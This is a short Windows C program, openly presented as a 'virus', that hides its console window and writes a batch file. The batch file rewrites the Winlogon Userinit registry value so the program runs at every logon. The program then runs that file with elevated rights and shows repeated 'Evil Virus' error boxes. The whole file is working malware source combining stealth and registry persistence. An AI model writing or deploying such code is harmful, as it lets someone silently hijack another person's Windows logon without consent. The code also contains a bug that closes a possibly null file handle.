// Method 1
#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <winuser.h>
#include <shlwapi.h>

#define MAX_IDFK_FUCKYOU_WINDOWS 512


void PrintToFile(void){
    TCHAR path[MAX_IDFK_FUCKYOU_WINDOWS];
    
    if(GetModuleFileName(NULL, path, MAX_IDFK_FUCKYOU_WINDOWS) == 0)
        GetLastError();
    
    PathRemoveFileSpec(path);
    FILE *pFile = fopen("bs.bat", "w");
    fprintf(pFile, "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /f /v Userinit /t REG_SZ /d \"%s\\virus_reg.exe\",\"C:\\Windows\\system32\\userinit.exe\"", path);
    fclose(pFile);
}


int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPerv, LPSTR lpCmdLine, int nCmdShow){

    FILE *pFile2;


	// To hide consle window
	HWND stealth;
    AllocConsole();
    stealth = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(stealth, 0);

    // PrintToFile();
    // ShellExecute(NULL, "runas", "bs.bat", NULL, NULL, SW_SHOWNORMAL);

    pFile2 = fopen("bs.bat", "r");
    if(pFile2 == NULL){
        // Adding to registry
        PrintToFile();
        ShellExecute(NULL, "runas", "bs.bat", NULL, NULL, SW_SHOWNORMAL);
        int i;
        for(i = 0; i < 10; i++)
            MessageBox(NULL, TEXT("Evil Virus"), TEXT("Virus"), MB_OK | MB_ICONERROR);
    } else {
        // Evil Part
        int i;
        for(i = 0; i < 10; i++)
            MessageBox(NULL, TEXT("Evil Virus"), TEXT("Virus"), MB_OK | MB_ICONERROR);
    }
    // Adding to registry 
    // PrintToFile();
    // ShellExecute(NULL, "runas", "bs.bat", NULL, NULL, SW_SHOWNORMAL);
    fclose(pFile2);
	return 0;
}